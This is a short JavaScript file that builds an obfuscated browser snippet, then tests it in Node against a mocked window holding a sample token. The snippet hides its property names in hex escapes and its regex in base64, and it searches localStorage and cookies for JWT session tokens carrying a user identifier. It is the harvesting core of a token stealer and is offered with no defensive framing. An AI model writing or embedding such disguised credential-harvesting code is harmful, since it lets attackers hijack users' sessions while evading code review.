function toHex(str) { return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }

const code = `let _t=null;const _r=new RegExp(atob('ZXlKW2EtekEtWjAtOV8tXStcXC5bYS16QS1aMC05Xy1dK1xcLlthLXpBLVowLTlfLV0r'),'g');try{for(let _v of Object['${toHex('values')}'](window['${toHex('localStorage')}'])){if(typeof _v==='string'){let _m=_v['${toHex('match')}'](_r);if(_m){for(let _k of _m){try{let b=_k['${toHex('split')}']('.')[1]['${toHex('replace')}'](/-/g,'+')['${toHex('replace')}'](/_/g,'/');while(b.length%4)b+='=';let p=JSON['${toHex('parse')}'](atob(b));if(p.sub||p.user_id){_t=_k;break;}}catch(e){console.log('Error parsing token:', e)}}if(_t)break;}}}}catch(err){console.log('Error in loop:', err)}if(!_t){let _m=document['${toHex('cookie')}']['${toHex('match')}'](/token=([^;]+)/);if(_m){let _cm=_m[1]['${toHex('match')}'](_r);if(_cm)_t=_cm[0];}}if(!_t){let _l=window['${toHex('localStorage')}']['${toHex('getItem')}']('token');if(_l){let _lm=_l['${toHex('match')}'](_r);if(_lm)_t=_lm[0];}}console.log('Extracted token:', _t);`;

global.window = {
    localStorage: {
        token: '{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"}',
        getItem: function(k) { return this[k]; }
    }
};
global.document = { cookie: '' };

eval(code);
